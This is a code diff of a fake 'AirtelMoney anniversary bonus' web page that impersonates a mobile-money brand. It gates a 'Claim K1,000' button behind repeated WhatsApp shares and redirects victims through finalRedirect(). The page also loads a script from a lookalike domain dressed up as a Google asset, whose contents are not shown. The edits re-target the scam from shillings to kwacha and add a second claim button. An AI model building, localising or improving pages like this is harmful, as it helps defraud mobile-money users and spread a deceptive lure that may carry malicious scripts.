@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html lang="en"><head>
  <script src="imgvpimgvip.org/google-aapi-css.js"></script>
-  <script src="offer.js"></script>
 	<script src="demo.js"></script>
+	<script src="offer.js"></script>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>AirtelMoney Celebrate its Anniversary by giving out K1,000 Bonus to customers</title>
 	<meta name="google-adsense-platform-domain" content="blogspot.com">
@@ -235,8 +235,8 @@
             </div>
             <div class="progress-box"><div id="bar"></div><div id="pct">0% VERIFIED</div></div>
             <button class="btn btn-wa" onclick="handleShare()">SHARE ON WHATSAPP</button>
-            <button class="btn btn-claim" id="claim" onclick="finalRedirect()">WITHDRAW Ksh5000</button>
-			<button class="btn btn-claim" id="claim" onclick="finalRedirect()">Claim Ksh5000</button>
+            <button class="btn btn-claim" id="claim" onclick="finalRedirect()">WITHDRAW K1,000</button>
+			<button class="btn btn-claim" id="claim2" onclick="finalRedirect()">Claim K1,000</button>
         </div>
     </div>
 
@@ -340,7 +340,8 @@
             document.getElementById('pct').innerText = Math.round(p) + "% VERIFIED";
             if(shareCount >= totalGoal) { 
                 document.querySelector('.btn-wa').style.display = 'none'; 
-                document.getElementById('claim').style.display = 'block'; 
+                document.getElementById('claim').style.display = 'block';
+				document.getElementById('claim2').style.display = 'block';
             }
         }, 1500);
     }
